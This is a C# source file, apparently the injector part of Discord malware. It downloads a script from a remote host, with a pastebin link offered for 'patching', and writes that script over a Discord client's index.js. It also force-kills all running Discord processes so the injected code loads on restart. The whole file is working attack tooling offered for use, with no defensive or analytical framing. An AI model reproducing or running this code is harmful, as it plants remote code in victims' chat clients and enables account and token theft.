using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.IO;
using System.Net;
using System.Diagnostics;

namespace DiscordInjector
{
    internal class ScriptInjector
    {
        public static string IndexJSPatcher = "https://pastebin.com/raw/PnES9N1a"; //use this link to patch your indexjs file
        public static string FileHoster;
        public static string DownloadedScript;
        public static void Downloader()
        {
            try
            {
                WebClient client = new WebClient();
                DownloadedScript = client.DownloadString(FileHoster);
                Console.WriteLine($"[{Utils.Time()}] Succesfully downloaded your script from: {FileHoster}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[{Utils.Time()}] Error detected during download process:");
                Console.WriteLine($"[{Utils.Time()}] {ex.Message}");
                Utils.Leave();
            }
        }
        public static void Injector(string IndexJS)
        {
            try
            {
                Console.ForegroundColor = ConsoleColor.Green;
                File.WriteAllText(IndexJS, DownloadedScript);
                Console.WriteLine($"[{Utils.Time()}] Succesfully injected your script here:\n{IndexJS}");
                Console.ResetColor();
            }
            catch(Exception ex)
            {
                Console.WriteLine($"[{Utils.Time()}] Error detected during injection process:");
                Console.WriteLine($"[{Utils.Time()}] {ex.Message}");
            }
        }
        public static void ClientKiller()
        {
            try
            {
                string[] ClientInstalled = { "Discord", "DiscordCanary", "DiscordDevelopment", "DiscordPTB", "cord", "iscord", "scord", "MobileDiscordPTB", "canary" };
                foreach (Process ClientToKill in Process.GetProcesses())
                {
                    if (ClientInstalled.Contains(ClientToKill.ProcessName))
                    {
                        ClientToKill.Kill();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[{Utils.Time()}] Error detected during killing process:");
                Console.WriteLine($"[{Utils.Time()}] {ex.Message}");
            }
        }
    }
}
